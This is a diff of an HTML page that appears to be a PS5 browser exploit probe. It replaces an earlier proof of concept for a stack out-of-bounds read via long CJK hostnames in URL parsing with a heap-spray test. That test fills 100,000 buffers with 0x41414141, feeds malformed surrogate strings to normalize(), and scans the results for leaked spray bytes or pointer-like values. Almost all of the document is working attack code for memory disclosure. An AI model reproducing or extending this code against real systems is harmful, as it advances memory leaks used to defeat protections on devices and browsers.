@@ -2,92 +2,104 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-43429 - URL IDNA Stack Leak</title>
+<title>PS5 CVE-2025-46299 - normalize() Heap Spray Leak</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting CVE-2025-43429 URL IDNA Stack Leak test...');
+L('[*] Starting CVE-2025-46299 normalize() Heap Spray Leak...');
 
-// CJK characters (\u4E00-\u9FFF) expand massively in Punycode.
-// 2048 CJK chars -> ~3500+ ASCII Punycode chars.
-// The input length is 2048 (passes the guard), but the output exceeds the 2048 buffer.
-// This causes an OOB read on the stack.
-
-const sizes = [100, 500, 1000, 1500, 2000, 2048, 3000, 4000];
-
-for (const size of sizes) {
-    try {
-        // Use a mix of CJK characters to ensure expansion
-        let domain = '';
-        for (let i = 0; i < size; i++) {
-            domain += String.fromCharCode(0x4E00 + (i % 100));
-        }
-        domain += '.com';
-        
-        let url = new URL('http://' + domain);
-        
-        // If we reach here, the parser accepted it.
-        // If the hostname length is > 2048, we definitely triggered the OOB read.
-        L('[+] Size ' + size + ': URL parsed. Hostname length: ' + url.hostname.length);
-        
-        // Check for non-Punycode garbage in the hostname
-        // Valid Punycode is xn--[a-z0-9-]+
-        // If we see non-ASCII or weird characters, it's leaked stack memory
-        let hn = url.hostname;
-        let anomalies = 0;
-        let hexDump = [];
-        
-        for (let i = 0; i < hn.length; i++) {
-            let code = hn.charCodeAt(i);
-            hexDump.push(code.toString(16).padStart(2, '0'));
-            
-            // Look for bytes > 0x7F (not ASCII) or control chars
-            if (code > 127 || (code < 32 && code !== 45 && code !== 46)) {
-                anomalies++;
-            }
-        }
-        
-        if (anomalies > 0) {
-            L('[!] ANOMALY DETECTED! Found ' + anomalies + ' non-ASCII chars in hostname!');
-            L('[!] THIS IS A STACK LEAK!');
-            L('[!] Hex dump (first 200 chars): ' + hexDump.slice(0, 200).join(' '));
-        } else if (hn.length > 2048) {
-            L('[!] HOSTNAME LENGTH > 2048! OOB read confirmed.');
-            L('[!] Hex dump (last 100 chars): ' + hexDump.slice(-100).join(' '));
-        }
-        
-    } catch (e) {
-        if (e.message.includes('cannot be parsed')) {
-            L('[-] Size ' + size + ': Rejected by URL parser');
-        } else {
-            L('[!] Size ' + size + ': ERROR: ' + e.message);
-        }
-    }
+// Step 1: Groom the heap with 0x41414141 in 80-byte chunks
+// StringImpl for a 20-char string is around 80 bytes.
+L('[*] Grooming heap with 0x41414141 (80-byte chunks)...');
+let spray = [];
+for (let i = 0; i < 100000; i++) {
+    let ab = new ArrayBuffer(80);
+    let view = new Uint32Array(ab);
+    for (let j = 0; j < 20; j++) view[j] = 0x41414141;
+    spray.push(ab);
 }
+spray = null; // Drop references, let GC claim them
 
-// Test with anchor element (different code path)
-L('\n--- Testing via Anchor element ---');
-try {
-    const a = document.createElement('a');
-    let domain = '';
-    for (let i = 0; i < 2048; i++) {
-        domain += String.fromCharCode(0x4E00 + (i % 100));
-    }
-    a.href = 'http://' + domain + '.com';
-    void a.offsetWidth; // Force layout
+// Step 2: Trigger normalize() with strings that might cause ICU underwrite
+L('[*] Triggering normalize() with edge cases...');
+
+const testStrings = [
+    // Strings with bad surrogates mixed with expanders
+    'A\uD800\uFDFA',
+    '\uFB01\uDC00\uFB03',
+    '\u212B\uD800\uFDFA',
     
-    L('[+] Anchor parsed. Hostname length: ' + a.hostname.length);
-    if (a.hostname.length > 2048) {
-        L('[!] ANCHOR OOB READ CONFIRMED!');
+    // Long strings with a single bad surrogate at the end
+    '\uFDFA'.repeat(100) + '\uD800',
+    '\uFB03'.repeat(100) + '\uDC00',
+    
+    // Strings that might cause ICU buffer overflow on second pass
+    '\uFDFA'.repeat(1000),
+    
+    // Rapidly switching between valid and invalid
+    '\uFDFA\uD800\uFDFA\uD800\uFDFA\uD800',
+    
+    // Boundary conditions for ICU internal buffers (often 256 or 2048)
+    '\uFDFA'.repeat(14),  // ~252 bytes output
+    '\uFDFA'.repeat(15),  // ~270 bytes output
+    '\uFDFA'.repeat(113), // ~2034 bytes output
+    '\uFDFA'.repeat(114), // ~2052 bytes output
+];
+
+let realLeakFound = false;
+
+for (const str of testStrings) {
+    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
+        try {
+            let res = str.normalize(form);
+            
+            // Convert to hex for analysis
+            let hex = [];
+            for (let i = 0; i < res.length; i++) {
+                hex.push(res.charCodeAt(i).toString(16).padStart(4, '0'));
+            }
+            let hexStr = hex.join(' ');
+            
+            // If we see a sequence of 0x4141 0x4141 0x4141 (our spray), that's a leak
+            if (hexStr.includes('4141 4141 4141')) {
+                L('[!] REAL LEAK DETECTED!');
+                L('    Input: ' + str.substring(0, 20));
+                L('    Form: ' + form);
+                L('    Length: ' + res.length);
+                L('    Hex: ' + hexStr.substring(0, 300) + '...');
+                realLeakFound = true;
+                break;
+            }
+            
+            // Also check for other obvious pointer patterns (0x7fxx or 0x0000)
+            // Pointers in x64 often look like 0x00007f... which as UChars is 0000 7fxx
+            if (hexStr.match(/0000 7f[0-9a-f]{2}/)) {
+                L('[!] POSSIBLE POINTER LEAK DETECTED!');
+                L('    Input: ' + str.substring(0, 20));
+                L('    Form: ' + form);
+                L('    Hex: ' + hexStr.substring(0, 300) + '...');
+                realLeakFound = true;
+                break;
+            }
+            
+        } catch (e) {
+            // Ignore exceptions
+        }
     }
-} catch (e) {
-    L('[!] Anchor test threw: ' + e.message);
+    if (realLeakFound) break;
 }
 
-L('\n[*] Test finished.');
+if (!realLeakFound) {
+    L('[*] No leak detected with 0x4141 pattern.');
+    L('[*] The bug may require a different heap layout or a different ICU trigger.');
+} else {
+    L('[+] LEAK CONFIRMED! We can now read memory addresses.');
+}
+
+L('[*] Test finished.');
 </script>
 </body>
-</html> 
+</html>
